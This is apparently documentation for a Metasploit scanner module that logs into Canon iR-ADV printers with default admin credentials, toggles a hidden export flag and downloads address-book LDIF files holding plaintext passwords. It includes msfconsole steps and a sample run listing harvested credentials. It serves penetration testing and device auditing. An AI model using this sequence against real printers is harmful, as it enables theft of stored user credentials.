## Vulnerable Application

This module targets Canon imageRUNNER ADVANCE (iR-ADV) multifunction printers that expose their embedded web management interface on TCP port 8000. It authenticates to the device management portal and exports address book entries in LDIF format, which includes stored passwords in plaintext.

Tested models (as documented in the module source):

- iR-ADV C2030
- iR-ADV 4045
- iR-ADV C5030
- iR-ADV C5235
- iR-ADV C5240
- iR-ADV 6055
- iR-ADV C7065

The module logs in via HTTP POST to `/login` using the device's administrator credentials, then temporarily enables password export (`ADRSEXPPSWDCHK=0`) via a POST to `/rps/cadrs.cgi`, fetches the LDIF export from `/rps/abook.ldif`, and resets the export flag (`ADRSEXPPSWDCHK=1`) before exiting. The LDIF content is stored as loot; individual entries containing both an email address and a `pwd` field are also stored as Metasploit credentials.

Unlike the other modules in this directory, this module communicates over HTTP rather than PJL/JetDirect.

## Verification Steps

1. Start `msfconsole`
2. Do: `use auxiliary/scanner/printer/canon_iradv_pwd_extract`
3. Do: `set RHOSTS [target IP]`
4. Do: `set USER [admin username]`
5. Do: `set PASSWD [admin password]`
6. Do: `run`
7. On success, the module prints the raw LDIF block, saves it as loot, and prints any extracted credential pairs (domain, username, password).

## Options

### RHOSTS

The target host(s) to scan. Accepts individual IPs, CIDR notation, or a file path prefixed with `file:`. Required.

### RPORT

The TCP port on which the Canon management interface is listening. (Default: `8000`)

### USER

The administrator username (department ID) for the Canon management portal. (Default: `7654321`, Required)

### PASSWD

The administrator password for the Canon management portal. (Default: `7654321`, Required)

### ADDRSBOOK

The address book number to extract, in the range 1–11. Each iR-ADV device can hold multiple address books; this option selects which one to export. (Default: `1`, Required)

### SSL

Set to `true` if the device management interface is served over HTTPS. (Default: `false`)

### TIMEOUT

Timeout in seconds for each HTTP request to the printer. (Default: `20`, Required)

### THREADS

Number of concurrent scan threads. (Default: `1`)

## Scenarios

### Extracting the default address book from a Canon iR-ADV C5030

Example output (synthesized for documentation purposes; actual values will vary by device):

```
msf6 > use auxiliary/scanner/printer/canon_iradv_pwd_extract
msf6 auxiliary(scanner/printer/canon_iradv_pwd_extract) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(scanner/printer/canon_iradv_pwd_extract) > run

[*] Attempting to extract passwords from the address books on the MFP at 192.168.1.100
[+] 192.168.1.100 - SUCCESSFUL login with USER='7654321' : PASSWORD='7654321'
[*] dn: cn=John Smith,ou=addressbook,o=local
cn: John Smith
mailaddress: jsmith@example.com
username: jsmith@example.com
pwd: Summer2023!
objectclass: inetOrgPerson

dn: cn=Jane Doe,ou=addressbook,o=local
cn: Jane Doe
mailaddress: jdoe@example.com
username: jdoe@example.com
pwd: printer1234
objectclass: inetOrgPerson

[+] Credentials saved in: /home/user/.msf4/loot/20231115130000_default_192.168.1.100_canon.iradv.add_123456.txt
[+] Domain: example.com
User: jsmith
Password: Summer2023!

[+] Domain: example.com
User: jdoe
Password: printer1234

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
